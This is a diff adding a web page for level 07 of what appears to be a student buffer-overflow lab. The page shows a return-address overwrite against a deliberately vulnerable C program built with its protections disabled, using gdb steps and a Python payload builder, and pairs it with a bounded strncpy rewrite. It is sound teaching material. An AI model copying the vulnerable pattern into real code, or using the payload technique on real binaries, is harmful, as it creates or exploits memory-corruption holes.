@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Level 07 — Return-Address Overwrite | CSS-LAB-BOA</title>
+<style>
+:root{
+  --bg:#0e1410;--bg-raised:#141c17;--ink:#e8efe9;--ink-dim:#9fb3a6;--rule:#28352d;
+  --accent:#7fe0a0;--vuln:#e07a7a;--secure:#7fe0a0;--bonus:#d9b15a;
+  --mono:"SFMono-Regular","JetBrains Mono",Consolas,Menlo,monospace;
+  --serif:"Iowan Old Style","Georgia","Charter",serif;
+  color-scheme:dark; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme:light){ :root:not([data-theme="dark"]){
+  --bg:#f3f1ea;--bg-raised:#fff;--ink:#1c2420;--ink-dim:#566058;--rule:#d9d4c6;
+  --accent:#1f7a46;--vuln:#a5342c;--secure:#1f7a46;--bonus:#8a6a1f; } }
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--serif);line-height:1.6;-webkit-font-smoothing:antialiased;}
+nav{position:sticky;top:env(safe-area-inset-top,0px);z-index:10;background:rgba(14,20,16,.94);backdrop-filter:blur(8px);border-bottom:1px solid var(--rule);overflow-x:auto;}
+.navrow{display:flex;gap:1.1rem;padding:.8rem 1.2rem;font-family:var(--mono);font-size:.74rem;white-space:nowrap;align-items:center;}
+.navrow a{color:var(--ink-dim);text-decoration:none;} .navrow a:hover{color:var(--accent);}
+.navrow .sep{color:var(--rule);}
+.wrap{max-width:800px;margin:0 auto;padding:3rem 1.4rem 6rem;}
+.kicker{font-family:var(--mono);font-size:.76rem;color:var(--ink-dim);margin:0 0 .7rem;}
+h1{font-size:clamp(1.7rem,5vw,2.3rem);margin:0 0 .9rem;font-weight:600;letter-spacing:-.01em;max-width:26ch;}
+.tagline{color:var(--ink-dim);max-width:60ch;margin:0 0 1.5rem;}
+.badge{display:inline-block;font-family:var(--mono);font-size:.68rem;padding:.15rem .5rem;border-radius:4px;border:1px solid currentColor;margin-left:.5rem;vertical-align:middle;}
+.badge.bonus{color:var(--bonus);}
+.badge.req{color:var(--secure);}
+section{margin:3.2rem 0;scroll-margin-top:3.4rem;}
+h2{font-family:var(--mono);font-size:.84rem;color:var(--accent);margin:0 0 1rem;font-weight:600;letter-spacing:.02em;text-transform:uppercase;}
+h3{font-size:1.05rem;margin:1.4rem 0 .6rem;font-weight:600;}
+p{max-width:70ch;} .lede{color:var(--ink-dim);}
+code,.mono{font-family:var(--mono);}
+.fn{color:var(--vuln);font-family:var(--mono);font-size:.95em;} .fn.safe{color:var(--secure);}
+.cwe{display:inline-block;background:var(--bg-raised);border:1px solid var(--rule);border-radius:5px;padding:.2rem .6rem;font-family:var(--mono);font-size:.76rem;color:var(--ink-dim);}
+
+pre{background:var(--bg-raised);border:1px solid var(--rule);border-radius:8px;padding:1rem 1.2rem;overflow-x:auto;font-family:var(--mono);font-size:.82rem;line-height:1.55;margin:.8rem 0 1.2rem;}
+pre.term{background:#000;}
+pre .c{color:var(--ink-dim);} pre .k{color:var(--vuln);} pre .k.safe{color:var(--secure);}
+pre .ok{color:var(--secure);} pre .err{color:var(--vuln);} pre .ghost{color:var(--ink-dim);}
+
+.codecols{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}
+@media (max-width:640px){.codecols{grid-template-columns:1fr;}}
+.codecol h4{font-family:var(--mono);font-size:.74rem;margin:0 0 .4rem;letter-spacing:.03em;}
+.codecol.v h4{color:var(--vuln);} .codecol.s h4{color:var(--secure);}
+.codecol pre{margin:0;height:100%;}
+
+.tracebox{background:var(--bg-raised);border:1px solid var(--rule);border-radius:8px;overflow:hidden;margin:.8rem 0 1.2rem;}
+.trow{display:grid;grid-template-columns:minmax(0,auto) 1fr;gap:1rem;padding:.6rem .9rem;border-bottom:1px solid var(--rule);}
+.trow:last-child{border-bottom:none;}
+.trow code{font-size:.78rem;color:var(--ink);white-space:nowrap;}
+.trow .expl{font-size:.86rem;color:var(--ink-dim);}
+
+.stackdiagram{font-family:var(--mono);font-size:.78rem;line-height:1.9;background:var(--bg-raised);border:1px solid var(--rule);border-radius:8px;padding:1rem 1.3rem;overflow-x:auto;white-space:pre;color:var(--ink-dim);margin:.8rem 0 1.2rem;}
+.stackdiagram .hi{color:var(--vuln);font-weight:700;}
+.stackdiagram .hi2{color:var(--bonus);font-weight:700;}
+
+.callout{border-left:3px solid var(--bonus);background:var(--bg-raised);border-radius:0 8px 8px 0;padding:.9rem 1.1rem;margin:1rem 0;font-size:.9rem;color:var(--ink-dim);}
+.callout b{color:var(--ink);}
+.callout.warn{border-left-color:var(--vuln);}
+
+footer{margin-top:4rem;padding-top:1.4rem;border-top:1px solid var(--rule);font-family:var(--mono);font-size:.76rem;color:var(--ink-dim);}
+a{color:var(--accent);}
+</style>
+</head>
+<body>
+<nav><div class="navrow">
+  <a href="index.html">All levels</a><span class="sep">|</span>
+  <a href="01-gets.html">01</a><span class="sep">·</span><a href="02-strcpy.html">02</a><span class="sep">·</span><a href="03-strcat.html">03</a><span class="sep">·</span><a href="04-sprintf.html">04</a><span class="sep">·</span><a href="05-memcpy.html">05</a><span class="sep">·</span><a href="06-array-indexing.html">06</a><span class="sep">·</span><span style="color:var(--accent)">07</span>
+</div></nav>
+<div class="wrap">
+
+  <p class="kicker">CSS-LAB-BOA <span style="opacity:.6">/ level 07</span></p>
+  <h1>Return-Address Overwrite<span class="badge bonus">BONUS</span></h1>
+  <p class="tagline">The deepest level in this lab: redirecting a program's execution entirely, by overwriting the one piece of memory that decides what runs next.</p>
+
+  <section id="overview">
+    <h2>1. Overview &amp; Vulnerability Theory</h2>
+    <h3>The vulnerable function</h3>
+    <p><span class="fn">strcpy(buffer, input) — same bug as Level 02, different consequence</span> — identical to Level 02's vulnerability in mechanism. What's different here is what sits in memory immediately after the buffer, and what compiler mitigations have been deliberately disabled to make that consequence observable.</p>
+    <h3>Why it fails at the memory level</h3>
+    <p>In Levels 01-06, the overflow corrupts a value. Here, with the stack canary disabled (-fno-stack-protector) and position-independent execution disabled (-fno-pie -no-pie), an overflow sized and positioned precisely enough reaches the saved return address itself — the value the CPU pops and jumps to when the current function returns. Overwrite it with the address of a function that was never legitimately called, and that function runs anyway.</p>
+    <div class="stackdiagram">higher addresses
+┌─────────────────────────┐
+│  saved return addr (RIP) │  <span class="hi">&lt;- THE TARGET: overwrite this</span>
+│  / link register (LR/x30 on AArch64) │
+├─────────────────────────┤
+│   saved base pointer     │  <span class="hi2">&lt;- overflow passes through here first</span>
+├─────────────────────────┤
+│   char buffer[16]        │  <span class="hi">&lt;- strcpy writes here, unbounded</span>
+└─────────────────────────┘
+lower addresses
+
+Payload shape:  [ N bytes of filler to reach the return address ]
+              + [ target address, packed little-endian ]</div>
+    <h3>Classification</h3>
+    <p><span class="cwe">CWE-787 / CWE-121</span> — CWE-787 (Out-of-bounds Write) escalated to full control-flow hijack; CWE-121 specifically covers stack-based buffer overflow as the delivery mechanism for return-address corruption.</p>
+  </section>
+
+  <section id="demo">
+    <h2>2. Step-by-Step Practical Demonstration</h2>
+    <h3>Compile</h3>
+    <pre class="">make LEVEL=07-bonus-redirect vuln
+# expands to: gcc -O0 -fno-stack-protector -fno-omit-frame-pointer \
+#   -fno-pie -no-pie -z execstack -o /tmp/07-bonus-redirect-vuln vuln.c
+#
+# This level ALONE in the entire lab disables PIE and NX -- see
+# docs/HARDENING.md for why these three flags are scoped only here.</pre>
+    <p class="lede" style="font-size:.86rem;">Via the project Makefile instead: <code>make LEVEL=07-bonus-redirect vuln</code> / <code>make LEVEL=07-bonus-redirect asan</code> — see <code>docs/HARDENING.md</code> for exactly why these specific flags are disabled here and nowhere else by default.</p>
+
+    <h3>Normal execution</h3>
+    <pre class="term">$ /tmp/07-bonus-redirect-vuln "Bhushan"
+Buffer: Bhushan
+Returned safely (no redirect).</pre>
+
+    <h3>Malicious input</h3>
+    <pre class="term">$ /tmp/07-bonus-redirect-vuln "$(cat /tmp/payload)"
+
+*** secret_win() reached -- control flow redirected ***
+
+# No ASan here by design -- the canary and PIE are off specifically so
+# this succeeds rather than being caught. See the walkthrough below for
+# how /tmp/payload is actually constructed.</pre>
+
+    <h3>Reading the ASan trace, line by line</h3>
+    <div class="tracebox"><div class="trow"><code>No ASan trace in this level</code><div class="expl">Deliberate: ASan and this exploit are mutually exclusive demonstrations. ASan's redzones would catch the overflow before it ever reached the return address. This level trades detection for exploitation -- showing what ASan exists to prevent.</div></div><div class="trow"><code>secret_win() reached</code><div class="expl">The entire proof of success. The function was compiled in but is never called anywhere in main() or vulnerable_read() -- if it runs, execution was genuinely redirected, not just coincidentally reached.</div></div></div>
+  </section>
+
+  <section id="fix">
+    <h2>3. The Secure Rewrite</h2>
+    <div class="codecols">
+      <div class="codecol v"><h4>vuln.c</h4><pre class="">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+__attribute__((noinline))
+void secret_win(void) {
+    printf("\n*** secret_win() reached -- "
+           "control flow redirected ***\n\n");
+}
+
+__attribute__((noinline))
+void vulnerable_read(char *input) {
+    char buffer[16];
+    strcpy(buffer, input);
+    /* VULNERABLE, canary/PIE disabled
+       at compile time */
+    printf("Buffer: %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc &lt; 2) return 1;
+    vulnerable_read(argv[1]);
+    printf("Returned safely (no redirect).\n");
+    return 0;
+}</pre></div>
+      <div class="codecol s"><h4>secure.c</h4><pre class="">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void secret_win(void) {
+    printf("\n*** secret_win() reached ***\n\n");
+}
+
+void secure_read(char *input) {
+    char buffer[16];
+    strncpy(buffer, input, sizeof(buffer) - 1);
+    buffer[sizeof(buffer) - 1] = '\0';
+    printf("Buffer: %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc &lt; 2) return 1;
+    secure_read(argv[1]);
+    printf("Returned safely.\n");
+    return 0;
+}</pre></div>
+    </div>
+    <h3>What changed, and why it's actually safe</h3>
+    <p>Identical fix to Level 02: strncpy() bounded to the buffer's actual size. The overflow never has anywhere near enough room to reach the return address, regardless of whether the canary, PIE, or NX are enabled or disabled -- the fix makes those mitigations irrelevant here rather than depending on them.</p>
+    <h3>Proof: same malformed input, secure build</h3>
+    <pre class="term">$ /tmp/secure "$(cat /tmp/payload)"
+Buffer: AAAAAAAAAAAAAAA
+Returned safely.
+# secret_win() is architecturally unreachable -- the overflow never
+# travels far enough to touch anything past buffer's 15 usable bytes.</pre>
+  </section>
+
+  
+  <section id="advanced">
+    <h2>4. Advanced Walkthrough — Control-Flow Hijack</h2>
+    
+    <div class="callout warn"><b>Read docs/HARDENING.md before running this.</b> Every offset and address below is valid for exactly the one build that produced it. This is a local debugging artifact, not a portable exploit technique — see the ASLR/environment-drift discussion at the end of this section.</div>
+
+    <h3>Step 1 — Disassemble and locate the target</h3>
+    <pre>$ gdb /tmp/07-bonus-redirect-vuln
+(gdb) disassemble vulnerable_read
+(gdb) print secret_win
+$1 = {void (void)} 0x4009... &lt;secret_win&gt;</pre>
+    <p>The <code>noinline</code> attribute on both functions (see the vuln.c above) matters here — without it, the compiler might fold <code>secret_win()</code> into nothing if it looks unreachable, or inline <code>vulnerable_read()</code> into <code>main()</code>, muddying the clean disassembly this walkthrough depends on.</p>
+
+    <h3>Step 2 — Find the exact offset to the return address</h3>
+    <p>Never guess this by eye, and never trust a number copied from someone else's run. This project ships a proper de Bruijn cyclic-pattern script specifically so the offset is derived, not assumed:</p>
+    <pre>$ python3 scripts/find_offset.py /tmp/07-bonus-redirect-vuln
+[*] Running with a 200-byte de Bruijn pattern...
+[+] pc = 0x... -&gt; offset 24 into the pattern</pre>
+    <p>On AArch64 specifically, the return address lives in the link register <code>x30</code>, spilled to the stack in the function's prologue — not at a fixed, architecture-independent offset the way RIP is on x86-64. The script's output accounts for this by reading whichever register (<code>pc</code>, <code>lr</code>, <code>rip</code>, or <code>x30</code>) actually appears in gdb's crash state, rather than assuming one architecture.</p>
+
+    <h3>Step 3 — Craft the payload</h3>
+    <pre>$ python3 -c "
+import struct, sys
+offset = 24          # from Step 2's actual output, not copied from here
+addr = 0x4009XX       # from Step 1's actual 'print secret_win' output
+payload = b'A' * offset + struct.pack('&lt;Q', addr)
+sys.stdout.buffer.write(payload)
+" > /tmp/payload
+
+$ /tmp/07-bonus-redirect-vuln "$(cat /tmp/payload)"</pre>
+    <p><code>struct.pack('&lt;Q', addr)</code> packs the target address as an 8-byte little-endian value, matching how x86-64 and AArch64 both store addresses in memory. On a 32-bit target this would be <code>'&lt;I'</code> and 4 bytes instead — <code>find_offset.py</code> accepts a width argument for exactly this case.</p>
+
+    <h3>Why hardcoded offsets fail in the real world</h3>
+    <p>Everything above was derived fresh, for one specific compiled binary, on one specific machine, in one specific gdb session. Four things break it immediately outside that exact context:</p>
+    <ul style="color:var(--ink-dim);font-size:.92rem;line-height:1.7;">
+      <li><b style="color:var(--ink)">ASLR</b> — address space layout randomization means the stack's base address (and therefore every absolute address on it) differs on every single run, on any system where it's enabled. This level works only because ASLR is off inside this specific sandbox container for this specific exercise.</li>
+      <li><b style="color:var(--ink)">PIE</b> — position-independent executables load at a randomized base address each run, same problem as ASLR but for the binary's own code addresses, including <code>secret_win()</code>'s. <code>-no-pie</code> is what makes <code>print secret_win</code>'s address usable at all here.</li>
+      <li><b style="color:var(--ink)">Environment and argv drift</b> — environment variables and argv strings are themselves placed on the stack before your program's frames, and their size and content shift the exact offset to everything below them. Running the identical binary with a different <code>PATH</code> or a different shell can change the offset found in Step 2.</li>
+      <li><b style="color:var(--ink)">Compiler, optimization level, and architecture</b> — a different gcc version, <code>-O2</code> instead of <code>-O0</code>, or a different CPU architecture entirely changes stack layout, calling convention, and frame structure. The offset found here has no claim to validity anywhere else.</li>
+    </ul>
+    <p>None of this is a flaw in the demonstration — it's the actual point. A real attacker without local shell access to the target, without the ability to disable its mitigations, and without an existing information leak to defeat ASLR cannot replicate this. Modern exploitation against a hardened target requires substantially more — typically a memory-disclosure bug to leak a real address, combined with return-oriented programming (ROP) to work around a non-executable stack. Neither is in scope for this lab.</p>
+  
+  </section>
+
+  <footer>CSS-LAB-BOA · Bhushan Ladgaonkar · TE Computer Engineering, Div A · FrCRCE · <a href="https://github.com/beeth73/CSS-LAB-BOA">repository</a></footer>
+</div>
+</body>
+</html>
